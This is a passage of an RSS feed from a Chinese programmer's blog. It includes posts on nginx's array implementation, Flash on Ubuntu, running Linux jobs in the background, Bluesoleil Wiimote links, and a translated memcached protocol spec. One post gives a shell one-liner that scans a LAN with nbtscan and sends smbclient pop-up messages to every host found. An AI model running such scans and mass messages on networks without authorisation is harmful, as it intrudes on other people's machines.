<![CDATA[C#的三种多线程交互方式]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200922064722324/</link>
      <description>
<![CDATA[做系统集成, 或者编写网络程序时, 多线程程序之间的调用是很常见而且很重要的技术. 用到的三种交互方式有: <br>回调; 引用; 数据绑定<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200922064722324/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu 10.04上玩三国杀]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010484535983/</link>
      <description>
<![CDATA[笔记本升级到Lucid， 遇到一下很恐怖的问题， 网页版三国杀不能玩了。<br>登录http://web.sanguosha.com后，下载完Flash后，提示是否允许本地存储，然后就杯具了，Allow按钮不能用，只好用VirtualBox开虚拟机运行Windows，然后在Windows里玩。<br>05年买的笔记本，跑虚拟机还是很费力的，而且感觉很不爽，一边玩，一边查资料，终于发现解决方案，安装最新adobe flash player10.1就可以了。<br>首先下载安装deb文件。<br>wget http://fpdownload.macromedia.com/get/flashplayer/current/install_flash_player_10_linux.deb<br>sudo dpkg -i install_flash_player_10_linux.deb<br>然后下载最新的10.1库文件<br>wget http://download.macromedia.com/pub/labs/flashplayer10/flashplayer10_1_rc4_linux_050510.tar.gz<br>tar xf flashplayer10_1_rc4_linux_050510.tar.gz<br>sudo cp libflashplayer.so /usr/lib/adobe-flashplugin/<br>然后重启Mozilla Firefox<br>然后再登录的时候， Allow按钮就可以用了！<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010484535983/</guid>
    </item>
    <item>
      <title>
<![CDATA[nginx的数据结构(1) 数组ngx_array_s]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201091142542388/</link>
      <description>
<![CDATA[nginx 定义了多种数据结构，包括：<br>1.数组: ngx_array_t 在core/ngx_array.{h,c}<br>2.链表: ngx_list_t 在core/ngx_list.{h,c}<br>3.队列: ngx_queue_t 在core/ngx_queue.{h,c}<br>4.基树: ngx_radix_tree_t 在core/ngx_radix_tree.{h,c}<br>5.红黑树: ngx_rbtree_t 在core/ngx_rbtree.{h,c}<br><br>其中的数组是比较简单的一个结构，如下所示：<br>core/ngx_array.h<br>struct ngx_array_s {<br>&nbsp;&nbsp;&nbsp; void&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *elts;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //数组元素所在的内存地址<br>&nbsp;&nbsp;&nbsp; ngx_uint_t&nbsp;&nbsp; nelts;&nbsp; //数组中已有的元素个数<br>&nbsp;&nbsp;&nbsp; size_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; size;&nbsp;&nbsp;&nbsp;&nbsp; //数组中每个元素的大小 <br>&nbsp;&nbsp;&nbsp; ngx_uint_t&nbsp;&nbsp; nalloc; //已分配空间中可存放的元素个数<br>&nbsp;&nbsp;&nbsp; ngx_pool_t&nbsp; *pool;&nbsp; //内存池指针<br>};<br><b>1. 创建数组</b>的操作如下所示：<br>1. 首先在内存池pool中申请一小片内存，用于ngx_array_s结构<br>2. 将数组的元素大小size和个数nalloc相乘，计算出数组所需内存，并在内存池pool中申请一片内存，用于存放元素<br>+-----------------+----------+--------+----+-----------+<br>| ngx_array_s&nbsp;&nbsp; |&nbsp; elem1&nbsp; | elem2 | .... | elemn&nbsp;&nbsp;&nbsp; |<br>+-----------------+----------+--------+----+-----------+<br>代码见core/ngx_array.c的ngx_array_create函数：<br>a = ngx_palloc(p, sizeof(ngx_array_t));&nbsp; 申请数组的数据结构的内存<br>a-&gt;elts = ngx_palloc(p, n * size);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 申请数组内的元素的内存<br><br><b>2. 加入元素</b>：<br>当数组不满的时候，直接将元素放入适当的位置即可。<br>当数组中已有元素的个数nelts等于数组中可存放元素个数时，若要再添加元素，则需要先扩展元素内存的大小，nginx采取的策略是扩展为原来大小的2倍<br>扩展方法分两种情况：<br>1. 元素内存之后的连续的内存尚未使用，则直接将内存池的空闲指针向后移动即可<br>2. 元素内存之后的连续的内存已被使用，则重新从内存池中空闲内存中申请一块可以存放nalloc*2个元素的内存，并将原来的nalloc个元素复制过去。<br><b>2.1 情况1：</b><br>ngx_array_s的elts指针指向数组内元素的起始位置，加上数组内元素的大小(元素大小和元素个数的乘积)，即可算出数组元素的结尾位置aend。内存池pool有一个last指针，指向当前空闲内存的位置，如果aend==last，则表示数组后面的空间是空闲的，如果空闲空间的大小足够放下一个元素，则可以直接将pool的free指针向后移动，即可实现ngx_array的扩展。<br>+-----------------+----------+--------+----+-----------+------------+<br>
| ngx_array_s&nbsp;&nbsp; |&nbsp; elem1&nbsp; | elem2 | .... | elemn&nbsp;&nbsp;&nbsp; | <b>newelem</b> |<br>
+-----------------+----------+--------+----+-----------+------------+<br>代码见core/ngx_array.c的ngx_array_push函数<br>if ((u_char *) a-&gt;elts + size == p-&gt;last //元素后面的空间是空闲的<br>&nbsp; &nbsp;&nbsp; &amp;&amp; p-&gt;last + a-&gt;size &lt;= p-&gt;end) //并且空间空间足够<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p-&gt;last += a-&gt;size; //内存池的指针向后移动<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a-&gt;nalloc++; //本数组的可容纳元素个数加1<br>}<br><b>2.2 情况2：</b><br>如果数组元素的结尾位置的pool的last指针不等，意味着数组元素后面被其它数据(something)占用了，就去pool的空闲空间中申请一块更大的内存，nginx采用原来大小的2倍，然后将原来的nalloc个元素(elem1-n)复制到新内存中(xelem1-n)，并加入新元素(newelem)。<br>+-----------------+----------+--------+----+-----------+-------------+----------+--------+----+-----------+-----------+----+---------+<br>

| ngx_array_s&nbsp;&nbsp; |&nbsp; elem1&nbsp; | elem2 | .... | elemn&nbsp;&nbsp;&nbsp; | something | xelem1&nbsp; | xelem2| .... | xelemn&nbsp;&nbsp; | newelem | ... | elem2n |<br>

+-----------------+----------+--------+----+-----------+-------------+----------+--------+----+-----------+-----------+----+---------+<br>代码见core/ngx_array.c的ngx_array_push函数：<br>else<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new = ngx_palloc(p, 2 * size); //申请新内存<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_memcpy(new, a-&gt;elts, size); //拷贝旧元素<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a-&gt;elts = new; //修改元素内存指针<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a-&gt;nalloc *= 2; //修改可容纳元素个数<br>}<br><b>3. 释放数组：</b><br>nginx 释放数组的方式很简单，和创建数组的方式相似：<br>如果元素的后面是空闲内存，即元素与空闲内存是连续的，则直接移动pool的last指针，将元素占用的内存加入空闲内存；然后判断数组的数据结构后面是否空闲内存，如果是则移动pool的last指针，将数组的数据结构内存加入空闲内存。<br>第一步将元素归还pool<br>+-----------------+----------+--------+----+-----------+<br>
| ngx_array_s&nbsp;&nbsp; |&nbsp; elem1&nbsp; | elem2 | .... | elemn&nbsp;&nbsp;&nbsp; |<br>
+-----------------+----------+--------+----+-----------+<br>去除元素后，pool的last指针前移，第二步将结构归还pool<br>+-----------------+<br>

| ngx_array_s&nbsp;&nbsp; |<br>

+-----------------+<br>代码见core/ngx_array.c的ngx_array_destroy函数<br>&nbsp;&nbsp;&nbsp; if ((u_char *) a-&gt;elts + a-&gt;size * a-&gt;nalloc == p-&gt;last) {//连续内存<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p-&gt;last -= a-&gt;size * a-&gt;nalloc;//释放元素<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if ((u_char *) a + sizeof(ngx_array_t) == p-&gt;last) {//连续内存<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p-&gt;last = (u_char *) a;//释放数组数据结构<br>&nbsp;&nbsp;&nbsp; }<br><br><b>问题</b>：<br>数组的设计很简单，和C++的vector设计基本一致。<br>特别的地方是：它从已经申请的pool中申请与释放内存，并不需要与操作系统接口调用，因此效率更好。<br>但是很明显这里没有处理碎片，例如先申请一个2个元素的数组a，再申请一个3个元素的数组b，再往a中加入3个元素，则a的原来两个元素()的内存就没有用了。但是也没有指针指向这块内存，只有等pool失效的时候才会回收。<br>+-----------+----------+--------+----------+--------+--------+---------+--------+---------+----+---------+<br>


| array a &nbsp; |&nbsp; <b>elem1&nbsp; | elem2 </b>| array_b | elem1 | elem2 | elem3&nbsp; | xelem1| xelem2 |&nbsp; ... | elem4 |<br>


+-----------+----------+--------+----------+--------+--------+---------+--------+---------+----+---------+<br>1. 申请产生空洞<br>向a中加入第3个元素时，elem2后面已经被array_b占用，所以要申请原来大小的2倍(2*2=4)的新内存(xelem1-4)。<br>并将array_a的eles指针指向这块新内存。此时黑体的elem1和elem2已经无人管理了，只有等pool失效的时候才能归还。<br>2. 释放产生空洞<br>如果此时释放数组b，数组b的结尾元素elem3，而pool的last指向数组a的elem4的尾部，明显二者不同，所以数组b的内存也不能归还pool。<br><br>但是由于nginx还有对pool的管理，所以不这个空洞只是暂时的，当pool销毁时，整个pool的内存都会归还，空洞随之消失。]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201091142542388/</guid>
    </item>
    <item>
      <title>
<![CDATA[[译]后台执行UNIX/Linux命令和脚本的五种方法]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010111492348473/</link>
      <description>
<![CDATA[原文：http://www.thegeekstuff.com/2010/12/5-ways-to-execute-linux-command/<br>by <span>SathiyaMoorthy</span> on <abbr title="2010-12-13"  >December 13, 2010</abbr><div>     </div>      <p><strong>问题:</strong> 我知道如何在前台执行Unix命令。你可不可以告诉我怎样在后台执行Linux命令？</p> <p><strong>答案:</strong> 你可以使用本文下面介绍的5种方法中的任意一种，在后台执行Linux命令或脚本。<br> <span id="more-4116"  ></span></p> <h3>1. 使用&amp;符号在后台执行命令</h3> <p>你可以在Linux命令或者脚本后面增加&amp;符号，从而使命令或脚本在后台执行，例如：.</p> <pre>$ ./my-shell-script.sh &amp;<br></pre> <p>详情请参考这篇文章 <a rel="nofollow" href="http://www.thegeekstuff.com/2010/05/unix-background-job/"  >Bg, Fg, &amp;, Ctrl-Z – 5 Examples to Manage Unix Background Jobs</a> <br></p> <h3>2. 使用nohup在后台执行命令</h3> <p>使用&amp;符号在后台执行命令或脚本后，如果你退出登录，这个命令就会被自动终止掉。要避免这种情况，你可以使用nohup命令，如下所示：</p> <pre>$ nohup ./my-shell-script.sh &amp;<br></pre> <p>详情请参考这篇文章 <a rel="nofollow" href="http://linux.101hacks.com/unix/nohup-command/"  >Unix Nohup: Run a Command or Shell-Script Even after You Logout</a><br></p> <h3>3. 使用screen执行命令</h3> <p>通过nohup和&amp;符号在后台执行命令后，即使你退出登录，这个命令也会一直执行。但是，你无法重新连接到这个会话，要想重新连接到这个会话，你可以使用screen命令。.</p> <p>Linux的screen命令提供了分离和重新连接一个会话的功能。当你重新连接这个会话的时候，你的终端和你分离的时候一模一样。</p> <p>详情请参考这篇文章 <a rel="nofollow" href="http://www.thegeekstuff.com/2010/07/screen-command-examples/"  >Screen Command Examples: Get Control of Linux / Unix Terminal</a> <br></p> <h3>4. 使用at将一个命令作为批处理执行</h3> <p>使用at命令，你可以让一个命令在指定的日期和时间运行，例如要在明天上午10点在后台执行备份脚本，执行下面的命令：</p> <pre>$ at -f backup.sh 10 am tomorrow<br></pre> <p>详情请参考这篇文章 <a rel="nofollow" href="http://www.thegeekstuff.com/2010/06/at-atq-atrm-batch-command-examples/"  >Understand at, atq, atrm, batch Commands using 9 Examples</a> <br></p> <p>在批处理模式下执行某些任务需要启用一些选项。下面的文章会给出详细解释：.</p> <ul><li> <a rel="nofollow" href="http://www.thegeekstuff.com/2009/10/how-to-capture-unix-top-command-output-to-a-file-in-readable-format/"  >How To Capture Unix Top Command Output to a File in Readable Format</a> </li><li> <a rel="nofollow" href="http://www.thegeekstuff.com/2009/11/unix-bc-command-line-calculator-in-batch-mode/"  >Unix bc Command Line Calculator in Batch Mode</a> </li><li><a rel="nofollow" href="http://www.thegeekstuff.com/2009/10/how-to-execute-ssh-and-scp-in-batch-mode-only-when-passwordless-login-is-enabled/"  > How To Execute SSH and SCP in Batch Mode (Only when Passwordless login is enabled)</a> </li></ul> <h3>5. 使用watch连续地执行一个命令</h3> <p>要想按一个固定的间隔不停地执行一个命令，可以使用watch命令，如下所示：</p> <pre>$ watch df -h<br></pre> <p>详情请参考这篇文章 <a rel="nofollow" href="http://www.thegeekstuff.com/2010/05/watch-command-examples/"  >Watch: Repeat Unix Commands or Shell-Scripts every N seconds</a> <br></p>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010111492348473/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用Bluesoleil的SDK连接Wiimote]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010411104629774/</link>
      <description>
<![CDATA[手动操作Bluesolei连接蓝牙，颇麻烦，还好Bluesoleil提供了SDK。<br>最新的Bluesolei 6需要注册，所以还是用Bluesolei 2.3.0版本，而最新的SDK不向下兼容，所以配套的SDK也要用0.8.3版的。<br>下载Bluesolei 2.3.0<br>http://www.general-search.com/fileinfo/2866960a<br>下载Bluesolei 0.8.3的SDK和User Guide<br>http://www.bluesoleil.com/download/detail.aspx?PID=18<br>使用Bluesoleil的SDK连接Wiimote的代码<br>http://code.google.com/p/pyfarm/downloads/detail?name=Wiimote.rar&amp;can=2&amp;q=<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010411104629774/</guid>
    </item>
    <item>
      <title>
<![CDATA[无所不能的shell]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200911145927849/</link>
      <description>
<![CDATA[扫描局域网内的电脑，并使用samba和Windows的Messenger服务给他们发送消息<br><br>nbtscan 192.201.0.2-254|awk '{print $2}' | sed -e '1,4d'|awk '{print "echo Time:duration|smbclient -M "$1"&amp;"}'|sed "s/duration/$1/"&gt;run.sh<br>chmod +x run.sh ; <br>./run.sh ; rm run.sh &amp;<br>首先扫描<br>然后提取计算机名称<br>删除前几个无效字符<br>构造smbclient命令<br>将smbclient命令中的一个duration用命令行参数替换掉<br>存入run.sh<br>设置为可执行<br>执行命令<br>删除可执行文件<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200911145927849/</guid>
    </item>
    <item>
      <title>
<![CDATA[[译]memcache协议]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200993123838933/</link>
      <description>
<![CDATA[Protocol<br>协议<br>--------<br><br>Clients of memcached communicate with server through TCP connections.<br>memcached的客户端和服务器使用TCP连接通信。<br>(A UDP interface is also available; details are below under "UDP<br>(还有一个UDP接口，详情参看下面的"UDP协议"部分)<br>protocol.") A given running memcached server listens on some<br>一个运行的memcached服务器在配制的端口监听;<br>(configurable) port; clients connect to that port, send commands to<br>客户端连接那个端口，然后给服务器发送命令，<br>the server, read responses, and eventually close the connection.<br>接收回复，最后关闭连接。<br><br>There is no need to send any command to end the session. A client may<br>不需要发送任何命令来结束会话。一个客户端在任何时候关闭连接。<br>just close the connection at any moment it no longer needs it. Note,<br>但是，注意，<br>however, that clients are encouraged to cache their connections rather<br>客户端最好缓存它们的连接，而不是在每次需要存取数据时<br>than reopen them every time they need to store or retrieve da<wbr>ta.&nbsp; This<br>都重新打开连接。<br>is because memcached is especially designed to work very efficiently<br>这是因为memcached被专门设计成高效的和<br>with a very large number (many hundreds, more than a thousand if<br>大量(几百，甚至一千多)的连接一起工作。<br>necessary) of open connections. Caching connections will eliminate the<br>缓存连接会降低建立TCP连接相关的开销(和这个开销相比，<br>overhead associated with establishing a TCP connection (the overhead<br>服务端准备一个新连接的开销是微乎其微的)<br>of preparing for a new connection on the server side is insignificant<br>compared to this).<br><br>There are two kinds of da<wbr>ta sent in the memcache protocol: text lines<br>memcached协议里发送的数据分两种：文本行和无结构数据。<br>and unstructured da<wbr>ta.&nbsp; Text lines are used for commands from clients<br>文本行用作客户端的命令和服务器的回复。<br>and responses from servers. Unstructured da<wbr>ta is sent when a client<br>客户端要存储和读取数据时，使用无结构数据。<br>wants to store or retrieve da<wbr>ta. The server will transmit back<br>服务器传输回来的无结构数据和接收到的无结构数据完全相同，<br>unstructured da<wbr>ta in exactly the same way it received it, as a byte<br>都是字节流。<br>stream. The server doesn't care about byte order issues in<br>服务器不关心也不知道无结构数据的字节顺序问题，<br>unstructured da<wbr>ta and isn't aware of them. There are no limitations on<br>无结构数据中的字符是没有限制的；<br>characters that may appear in unstructured da<wbr>ta; however, the reader<br>但是，这些数据的读取者（客户端或服务器）<br>of such da<wbr>ta (either a client or a server) will always know, from a<br>通过前面的一个文本行，可以知道传输的数据块长度，<br>preceding text line, the exact length of the da<wbr>ta block being<br>transmitted.<br><br>Text lines are always terminated by \r\n. Unstructured da<wbr>ta is _also_<br>文本行总是以\r\n结束，无结构数据也总是以\r\n结束，<br>terminated by \r\n, even though \r, \n or any other 8-bit characters<br>尽管数据里可能出现\r\n或任何其它8bit字符。<br>may also appear inside the da<wbr>ta. Therefore, when a client retrieves<br>因此，当一个客户端从服务器接收数据时，<br>da<wbr>ta from a server, it must use the length of the da<wbr>ta block (which it<br>它必须通过数据块的长度(服务器会提供的)<br>will be provided with) to determine where the da<wbr>ta block ends, and not<br>来决定数据块何时结束。<br>the fact that \r\n follows the end of the da<wbr>ta block, even though it<br>而不是通过\r\n在数据块的后面。<br>does.<br><br>Keys<br>关键字<br>----<br><br>Da<wbr>ta stored by memcached is identified with the help of a key. A key<br>memcached存储的数据是通过关键字识别的。<br>is a text string which should uniquely identify the da<wbr>ta for clients<br>一个关键字是一个文本字符串，它独一无二地标示<br>that are interested in storing and retrieving it.&nbsp; Currently the<br>客户端需要存取的数据。<br>length limit of a key is set at 250 characters (of course, normally<br>目前关键字的长度上限是250字符(当然，一般客户端不<br>clients wouldn't need to use such long keys); the key must not include<br>需要使用那么长的关键字);关键字不能包含控制字符或空格。<br>control characters or whitespace.<br><br>Commands<br>命令<br>--------<br><br>There are three types of commands. <br>memcached有三种命令<br><br>Storage commands (there are three: "set", "add" and "replace") ask the<br>存储命令(有三个: "set", "add"和"replace")请求<br>server to store some da<wbr>ta identified by a key. The client sends a<br>服务器存储以一个关键字标示的一些数据。客户端发送一个<br>command line, and then a da<wbr>ta block; after that the client expects on<wbr>e<br>命令行，然后一个数据块；然后客户端等待<br>line of response, which will indicate success or faulure.<br>指示成功或失败的一行回复，<br><br>Retrieval commands (there is on<wbr>ly on<wbr>e: "get") ask the server to<br>获取命令(只有一个:"get")请求服务器<br>retrieve da<wbr>ta corresponding to a set of keys (on<wbr>e or more keys in on<wbr>e<br>返回一系列关键字指定的数据(一个请求可以有一到多个关键字)<br>request). The client sends a command line, which includes all the<br>客户端发送一个命令行，包含所有请求的关键字；<br>requested keys; after that for each item the server finds it sends to<br>然后服务器对找到的每个数据，首先发给<br>the client on<wbr>e response line with information about the item, and on<wbr>e<br>客户端一行关于该数据信息回复，然后<br>da<wbr>ta block with the item's da<wbr>ta; this continues until the server<br>发送一个该数据的数据块；一直重复到服务器<br>finished with the "END" response line.<br>以一行“END”回复结束，<br><br>All other commands don't involve unstructured da<wbr>ta. In all of them,<br>所有其它的命令都不涉及无结构数据。任何情况下，<br>the client sends on<wbr>e command line, and expects (depending on the<br>客户端发送一个命令行，然后等待(依赖命令)<br>command) either on<wbr>e line of response, or several lines of response<br>一行回复，或者最后一行以“END”结束的几行回复。<br>ending with "END" on the last line.<br><br>A command line always starts with the name of the command, followed by<br>一个命令行总是以命令的名称开头，后面跟着<br>parameters (if any) delimited by whitespace. Command names are<br>以空格分割的关键字。命令名称都是<br>lower-case and are case-sensitive.<br>大小写敏感的小写字母。<br><br>Expiration times<br>超时<br>----------------<br><br>Some commands involve a client sending some kind of expiration time<br>有些命令需要客户端发送某些超时<br>(relative to an item or to an operation requested by the client) to<br>()给服务器<br>the server. In all such cases, the actual value sent may either be<br>这种情况下，实际发送的值是Unix时间<br>Unix time (number of seconds since January 1, 1970, as a 32-bit<br>(一个32bit的值，从1970年1月1日开始的秒数)<br>value), or a number of seconds starting from current time. In the<br>或者一个表示从现在开始的秒数的数字。<br>latter case, this number of seconds may not exceed 60*60*24*30 (number<br>在后一种情况下，这个秒数可能超过60*60*24*30<br>of seconds in 30 days); if the number sent by a client is larger than<br>(30天的秒数)；如果客户端发送的秒数超过那个值，<br>that, the server will consider it to be real Unix time value rather<br>服务器会将它作为一个真正的Unix时间而不是<br>than an offset from current time.<br>从现在开始的时间偏差。<br><br><br>Error strings<br>错误字符串<br>-------------<br><br>Each command sent by a client may be answered with an error string<br>客户端发送的每一个命令都可能从服务器收到一个错误字符串<br>from the server. These error strings come in three types:<br>的回复。这些错误字符串分三类：<br><br>- "ERROR\r\n" <br><br>&nbsp; means the client sent a nonexistent command name.<br>&nbsp; 意思是客户端发送了一个不存在的命令名称<br><br>- "CLIENT_ERROR &lt;error&gt;\r\n"<br><br>&nbsp; means some sort of client error in the input line, i.e. the input<br>&nbsp; 意思是客户端输入的某些错误，例如，输入不符合<br>&nbsp; doesn't conform to the protocol in some way. &lt;error&gt; is a<br>&nbsp; 协议。&lt;error&gt;是一个人可读的错误字符串<br>&nbsp; human-readable error string.<br><br>- "SERVER_ERROR &lt;error&gt;\r\n"<br><br>&nbsp; means some sort of server error prevents the server from carrying<br>&nbsp; 意思是服务器的某些错误妨碍了服务器执行命令。<br>&nbsp; out the command. &lt;error&gt; is a human-readable error string. In cases<br>&nbsp; &lt;error&gt;是一个人可读的错误字符串。有几种服务器错误<br>&nbsp; of severe server errors, which make it impossible to continue<br>&nbsp; 使服务器不能继续向客户端提供服务<br>&nbsp; serving the client (this shouldn't normally happen), the server will<br>&nbsp; (这中情况一般不应该发生)，服务器将<br>&nbsp; close the connection after sending the error line. This is the on<wbr>ly<br>&nbsp; 在发送完错误行后关闭连接。这也是服务器主动关闭<br>&nbsp; case in which the server closes a connection to a client.<br>&nbsp; 和客户端连接的唯一情况。<br><br><br>In the descriptions of individual commands below, these error lines<br>下面的具体命令描述里，这些错误<br>are not again specifically mentioned, but clients must allow for their<br>不会被再次明确的提起，但是客户端必须允许这些错误。<br>possibility.<br><br><br>Storage commands<br>存储命令<br>----------------<br><br>First, the client sends a command line which looks like this:<br>首先，客户端发送一个这样的命令行：<br><br>&lt;command name&gt; &lt;key&gt; &lt;flags&gt; &lt;exptime&gt; &lt;bytes&gt;\r\n<br>&lt;命令名称&gt; &lt;关键字&gt; &lt;标志&gt; &lt;超时&gt; &lt;字节&gt;\r\n<br><br>- &lt;command name&gt; is "set", "add" or "replace"<br>- &lt;命令名称&gt;是"set", "and"或者"replace"<br><br>&nbsp; "set" means "store this da<wbr>ta". &nbsp;<br>&nbsp; "set"的意思是“存储这些数据”<br>&nbsp; &nbsp;<br><br>&nbsp; "add" means "store this da<wbr>ta, but on<wbr>ly if the server *doesn't* already<br>&nbsp; "add"的意思是"仅当服务器上不存在这个关键字的数据时，<br>&nbsp; hold da<wbr>ta for this key". &nbsp;<br>&nbsp; 存储这些数据"<br><br>&nbsp; "replace" means "store this da<wbr>ta, but on<wbr>ly if the server *does*<br>&nbsp; "replace"的意思是"仅当服务器上已经存在这个关键字的数据时<br>&nbsp; already hold da<wbr>ta for this key".<br>&nbsp; ，存储这些数据"<br><br>- &lt;key&gt; is the key under which the client asks to store the da<wbr>ta<br>- &lt;关键字&gt;是客户端要存储的数据的关键字<br><br>- &lt;flags&gt; is an arbitrary 16-bit unsigned integer (written out in<br>- &lt;标志&gt;是一个任意的16bit无符号数(10进制表示)<br>&nbsp; decimal) that the server stores along with the da<wbr>ta and sends back<br>&nbsp; 服务器将其和数据一起存储，查询时和数据一起返回。<br>&nbsp; when the item is retrieved. Clients may use this as a bit field to<br>&nbsp; 客户端可以将它作为一个bit字段来存储特殊数据信息；<br>&nbsp; store da<wbr>ta-specific information; this field is opaque to the server.<br>&nbsp; 这个字段对服务器是不透明的。<br><br>- &lt;exptime&gt; is expiration time. If it's 0, the item never expires<br>- &lt;超时&gt;是超时的时间。如果它是0，这个数据用不超时<br>&nbsp; (although it may be deleted from the cache to make place for other<br>&nbsp; (虽然它可能会被从缓存中移出以给其它数据腾空间)<br>&nbsp; items). If it's non-zero (either Unix time or offset in seconds from<br>&nbsp; 如果它是非0(无论是Unix时间还是当前时间的偏移秒数),<br>&nbsp; current time), it is guaranteed that clients will not be able to<br>&nbsp; 客户端在超时后(以服务器时间为准)<br>&nbsp; retrieve this item after the expiration time arrives (measured by<br>&nbsp; 必定不能在获得那个数据<br>&nbsp; server time). &nbsp;<br><br>- &lt;bytes&gt; is the number of bytes in the da<wbr>ta block to follow, *not*<br>- &lt;字节&gt;是接下来的数据块的字节数，不包括\r\n分隔符。<br>&nbsp; including the delimiting \r\n. &lt;bytes&gt; may be zero (in which case<br>&nbsp; 字节数可能为0(这种情况下后面<br>&nbsp; it's followed by an empty da<wbr>ta block).<br>&nbsp; 跟一个空的数据块).<br><br>After this line, the client sends the da<wbr>ta block:<br>这一行结束后，客户端发送数据块:<br><br>&lt;da<wbr>ta block&gt;\r\n<br>&lt;数据块&gt;\r\n<br><br>- &lt;da<wbr>ta block&gt; is a chunk of arbitrary 8-bit da<wbr>ta of length &lt;bytes&gt;<br>- &lt;数据块&gt;是一大块长度为上一行的&lt;字节数&gt;的8bit数据<br>&nbsp; from the previous line.<br><br>After sending the command line and the da<wbr>ta blockm the client awaits<br>发送完命令行和数据块后，客户端等待回复，<br>the reply, which may be:<br>回复可能是：<br><br>- "STORED\r\n", to indicate success.<br>- "STORED\r\n",表示成功<br><br>- "NOT_STORED\r\n" to indicate the da<wbr>ta was not stored, but not<br>- "NOT_STORED\r\n" 表示数据没有被存储，但不是<br>because of an error. This normally means that either that the<br>因为错误。这一般意味着"add"或"replace"命令的条件<br>condition for an "add" or a "replace" command wasn't met, or that the<br>没有满足，或者这个数据<br>item is in a delete queue (see the "delete" command below).<br>在删除队列里(参考下面的"删除"命令)<br><br><br>Retrieval command:<br>获取命令<br>------------------<br><br>The retrieval command looks like this:<br>获取命令看起来像这样<br><br>get &lt;key&gt;*\r\n<br>get&lt;关键字&gt;*\r\n<br><br>- &lt;key&gt;* means on<wbr>e or more key strings separated by whitespace.<br>- &lt;关键字&gt;* 表示一到多个以空格分割的关键字字符串。<br><br>After this command, the client expects zero or more items, each of<br>这个命令后，客户端等待0或多个数据，每个<br>which is received as a text line followed by a da<wbr>ta block. After all<br>都以文本行加数据块的方式接收。所有的<br>the items have been transmitted, the server sends the string<br>数据都传输完后，服务器发送一个字符串<br><br>"END\r\n"<br>"END\r\n"<br><br>to indicate the end of response.<br>表示回复的结束<br><br>Each item sent by the server looks like this:<br>服务器发送的每个数据都是这样的：<br><br>VALUE &lt;key&gt; &lt;flags&gt; &lt;bytes&gt;\r\n<br>VALUE &lt;关键字&gt; &lt;标志&gt; &lt;字节数&gt;\r\n<br>&lt;da<wbr>ta block&gt;\r\n<br>&lt;数据块&gt;\r\n<br><br>- &lt;key&gt; is the key for the item being sent<br>- &lt;关键字&gt;是传输的数据的关键字<br><br>- &lt;flags&gt; is the flags value set by the storage command<br>- &lt;标志&gt; 是存储命令设置的标志值<br><br>- &lt;bytes&gt; is the length of the da<wbr>ta block to follow, *not* including<br>- &lt;字节数&gt;是接下来的数据块的长度，不包含\r\n分隔符<br>&nbsp; its delimiting \r\n<br><br>- &lt;da<wbr>ta block&gt; is the da<wbr>ta for this item.<br>- &lt;数据块&gt;是数据的值<br><br>If some of the keys appearing in a retrieval request are not sent back<br>如果服务器没有返回客户端获取请求的某些关键字，<br>by the server in the item list this means that the server does not<br>意味着服务器没有保存哪些关键字对应的数据<br>hold items with such keys (because they were never stored, or stored<br>(因为它们没有被存储过，或者存储过<br>but deleted to make space for more items, or expired, or explicitly<br>但是被删除了，或者失效了，或者被某个客户端明确的<br>deleted by a client).<br>删除了).<br><br><br><br>Deletion<br>删除<br>--------<br><br>The command "delete" allows for explicit deletion of items:<br>"delete"命令与允许这样明确的删除数据：<br><br>delete &lt;key&gt; &lt;time&gt;\r\n<br>delete &lt;关键字&gt; &lt;时间&gt;\r\n<br><br>- &lt;key&gt; is the key of the item the client wishes the server to delete<br>- &lt;关键字&gt; 是客户端请求服务器删除的数据的关键字<br><br>- &lt;time&gt; is the amount of time in seconds (or Unix time until which)<br>- &lt;时间&gt;是客户端希望服务器拒绝对这个关键字<br>&nbsp; the client wishes the server to refuse "add" and "replace" commands<br>&nbsp; 进行"add"和"replace"命令的总秒数(或者Unix时间)<br>&nbsp; with this key. For this amount of item, the item is put into a<br>&nbsp; 